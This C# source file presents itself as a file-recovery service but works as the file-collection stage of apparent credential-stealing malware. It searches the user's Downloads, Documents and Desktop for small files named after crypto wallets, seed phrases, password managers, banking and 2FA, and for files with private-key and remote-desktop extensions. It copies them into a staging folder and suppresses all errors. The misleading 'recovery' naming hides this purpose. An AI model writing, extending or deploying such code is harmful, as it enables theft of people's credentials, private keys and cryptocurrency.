using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.System
{
    public static class FileRecoveryService
    {
        private static readonly HashSet<string> AllowedExtensions = new(StringComparer.OrdinalIgnoreCase)
        {
            ".jpg", ".png", ".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx",
            ".ldb", ".log", ".pem", ".ppk", ".key", ".pfx"
        };

        private static readonly HashSet<string> Keywords = new(StringComparer.OrdinalIgnoreCase)
        {
            "2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc",
            "casino", "code", "coinbase", "crypto", "dashlane", "discord", "eth", "exodus", "facebook",
            "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login",
            "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal",
            "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server",
            "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo",
            "vault", "wallet"
        };

        private static readonly string[] Paths =
        [
            Path.Combine(Common.UserProfile, "Downloads"),
            Path.Combine(Common.UserProfile, "Documents"),
            Path.Combine(Common.UserProfile, "Desktop")
        ];

        private static readonly SemaphoreSlim CopySemaphore = new(Environment.ProcessorCount * 2);

        public static async Task SaveFileRecoveryAsync()
        {
            string recoveryPath = Common.EnsureFileRecoveryPath();
            var copyTasks = new List<Task>();

            foreach (var path in Paths)
            {
                try
                {
                    var tasks = await ProcessDirectoryAsync(path, recoveryPath);
                    copyTasks.AddRange(tasks);
                } catch { }
            }

            await Task.WhenAll(copyTasks);
        }

        private static async Task<IEnumerable<Task>> ProcessDirectoryAsync(string sourcePath, string destinationPath)
        {
            var copyTasks = new List<Task>();

            try
            {
                var files = await Task.Run(() =>
                    Directory.EnumerateFiles(sourcePath, "*.*", new EnumerationOptions
                    {
                        IgnoreInaccessible = true,
                        RecurseSubdirectories = true
                    })
                    .Where(file =>
                        !file.StartsWith(Common.recoveryBasePath, StringComparison.OrdinalIgnoreCase) &&
                        AllowedExtensions.Contains(Path.GetExtension(file)) &&
                        GetFileSize(file) < 1_000_000 &&
                        FilenameContainsKeyword(Path.GetFileName(file)))
                    .ToList());

                foreach (var file in files)
                {
                    var destFile = Path.Combine(destinationPath, Path.GetFileName(file));

                    if (!string.Equals(file, destFile, StringComparison.OrdinalIgnoreCase))
                    {
                        copyTasks.Add(CopyFileAsync(file, destFile));
                    }
                }
            } catch { }

            return copyTasks;
        }

        private static long GetFileSize(string filePath)
        {
            try
            {
                return new FileInfo(filePath).Length;
            }
            catch
            {
                return long.MaxValue;
            }
        }

        private static bool FilenameContainsKeyword(string fileName)
        {
            return Keywords.Any(keyword => fileName.Contains(keyword, StringComparison.OrdinalIgnoreCase));
        }

        private static async Task CopyFileAsync(string sourceFile, string destinationFile)
        {
            await CopySemaphore.WaitAsync();
            try
            {
                using var sourceStream = new FileStream(
                    sourceFile,
                    FileMode.Open,
                    FileAccess.Read,
                    FileShare.Read,
                    bufferSize: 81920,
                    useAsync: true);

                using var destinationStream = new FileStream(
                    destinationFile,
                    FileMode.Create,
                    FileAccess.Write,
                    FileShare.None,
                    bufferSize: 81920,
                    useAsync: true);

                await sourceStream.CopyToAsync(destinationStream);
            } catch { }
            finally
            {
                CopySemaphore.Release();
            }
        }
    }
}
